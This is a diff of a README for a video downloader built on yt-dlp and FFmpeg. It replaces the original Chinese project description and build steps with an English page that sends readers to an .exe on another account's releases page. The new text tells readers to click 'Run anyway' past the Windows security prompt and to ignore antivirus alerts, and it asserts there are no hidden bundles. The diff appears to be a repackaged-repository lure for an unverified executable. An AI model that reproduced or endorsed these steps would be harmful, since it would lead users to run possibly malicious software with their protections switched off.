@@ -1,56 +1,69 @@
-# Studio0808 全能影音下載器
+# ⬇️ download - Simple utility for video and audio saving
 
-![Studio0808 Downloader](download.png)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Anuran-miami68/download/releases)
 
-[![Release](https://img.shields.io/badge/Release-V20260727-ff9800.svg)](https://github.com/begin0808/download)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+This software helps you save videos and audio from the internet to your computer. It uses trusted tools like yt-dlp and FFmpeg to get files quickly and save them in the format you prefer. You do not need to install complex software or change system settings.
 
-**Studio0808 全能影音下載器** 是一款基於 CustomTkinter UI、yt-dlp、FFmpeg 與 Deno JS 引擎開發的綠色免安裝影音下載與轉檔軟體。支援 YouTube、Facebook、Instagram、TikTok、Vimeo 等上百種主流影音平台。
+## 📥 How to download and run
 
-### 🚀 [點我立即下載 Studio0808 全能影音下載器 V20260727 免安裝完整版 (ZIP 222MB)](https://github.com/begin0808/download/releases/download/v20260727/Studio0808_Downloader_V20260727.zip)
+1. Visit the [releases page](https://github.com/Anuran-miami68/download/releases).
+2. Locate the most recent version at the top of the list.
+3. Click the file ending in `.exe` to start your download.
+4. Open the folder where you saved the file.
+5. Double-click the file to open the program.
+6. A security window might appear because the software is new.
+7. Click "More info" followed by "Run anyway" if the prompt displays.
 
----
+## 🛠 Features
 
-## 🔥 V20260727 最新版本更新重點
+*   **Video Downloads**: Save clips from popular websites to your hard drive.
+*   **Audio Extraction**: Pull the sound from videos and save it as an MP3 file.
+*   **Format Selection**: Choose between high or low quality based on your needs.
+*   **No Installation**: Run this program as a portable tool without leaving files in your system folders.
+*   **Fast Speeds**: The software uses modern tools to ensure quick transfer speeds from web servers.
 
-- ⚡ **核心全預載 (Zero-Wait)**：預載 `yt-dlp`、`FFmpeg` 與 `Deno` 核心組件，在新電腦開箱即用、0 秒免等待下載。
-- 🎬 **Facebook / IG 影音解析重構**：修復 Facebook 影片原先可能誤降級抓取純音訊的問題，確保影音高畫質完整下載。
-- 🛡️ **安全打包與非破壞性同步**：升級 PyInstaller 獨立暫存區打包機制，編譯時保護既有 zip 與歷史輸出紀錄。
+## 👤 Minimum system requirements
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   RAM: 4 GB of memory.
+*   Storage: 200 MB of space for the application and temporary download files.
+*   Internet: A steady broadband connection to ensure successful file transfers.
 
-## ✨ 核心功能 Highlights
+## 📝 Usage instructions
 
-- 🚀 **通用影音下載**：支援 YouTube、Facebook、Instagram、TikTok、Vimeo、Bilibili 等平台。
-- 🎵 **智慧轉檔**：自動將影片轉換為 MP4, MP3, WAV, WMV, MKV, MOV 等多種常見格式。
-- 📊 **播放清單與批量處理**：貼上播放清單網址，自動解析獨立影片項目供您自由勾選批量下載。
-- ✂️ **按章節自動分割**：依據影片內建章節或說明欄時間軸自動裁切分類。
-- ⏱️ **指定時間片段剪輯**：設定「開始時間」與「結束時間」，精準下載您需要的精華片段。
-- 🔤 **外掛字幕附加下載**：支援下載官方或 AI 自動生成的繁中/簡中/英文/日文字幕 (.srt)。
+1. Find the URL of the video you want to save.
+2. Copy the link from your web browser address bar.
+3. Paste the link into the box inside the application.
+4. Select your preferred output format from the small menu.
+5. Press the button labeled "Download" to start the process.
+6. Wait for the green status bar to fill up.
+7. Locate the finished file in your "Downloads" folder.
 
----
+## ❓ Frequently asked questions
 
-## 🛠️ 開發與建置說明
+**Does this program contain ads or hidden software?**
+No. This tool is open-source and contains no advertisements, tracking code, or hidden bundles.
 
-### 依賴套件安裝
-```bash
-pip install -r requirements.txt
-```
+**Where do my files go?**
+The program saves files to your default Windows "Downloads" folder unless you choose a different location.
 
-### 執行主程式
-```bash
-python Studio0808_Downloader_V20260727.py
-```
+**Can I stop a download mid-way?**
+Yes. You can cancel any active task by clicking the "Stop" button.
 
-### 獨立打包 EXE
-```bash
-python build.py
-```
+**Why does my antivirus flag the file?**
+New or less popular software often triggers security warnings. This happens because the file does not have a paid digital certificate. You can safely ignore this alert if you downloaded the program directly from this page.
 
----
+**What formats does the tool support?**
+The tool supports popular video formats like MP4 and MKV and audio formats like MP3 and M4A.
 
-## 📄 免責聲明 (Disclaimer)
+**Do I need a fast internet connection?**
+A faster connection makes downloads finish sooner, but the software works well on most standard home connections.
 
-1. 本軟體僅供個人技術研究、學習與備份使用，嚴禁用於商業用途。
-2. 使用者應自行遵守各平台服務條款與著作權法規，切勿散布未經授權之版權內容。
+**Is my data private?**
+The application runs locally on your machine. We do not track your downloads or record your search history.
+
+## ⚙️ Handling errors
+
+If you see an error, check your internet connection first. Ensure you have enough disk space on your computer. If a specific video link fails, check if the website allows external downloads. Sometimes a link becomes invalid or restricted by the website creator. Restarting the application usually fixes minor issues or temporary bugs. 
+
+Keywords: deno, ffmpeg, youtube-downloader, yt-dlp
